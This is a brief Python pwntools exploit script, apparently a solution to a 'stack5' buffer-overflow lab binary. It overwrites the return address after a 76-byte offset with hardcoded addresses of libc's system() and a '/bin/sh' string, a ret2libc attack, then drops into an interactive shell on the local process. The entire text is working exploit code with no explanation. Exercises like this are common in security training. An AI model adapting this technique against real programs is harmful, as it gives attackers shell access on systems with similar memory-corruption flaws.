import struct
import sys

from pwn import *

context.clear(arch='i386')

#p = process('./stack5')

#p.sendline(cyclic(256))
#p.wait()

offset = 76

#libc = ELF(p.corefile.libc.path)

sys = 0xf7e0d360
placeholder = b'0000'
binsh = 0xf7f57363

expl = offset*b'A' + p32(sys) + placeholder + p32(binsh)


p = process('./stack5')

p.sendline(expl)
p.interactive()
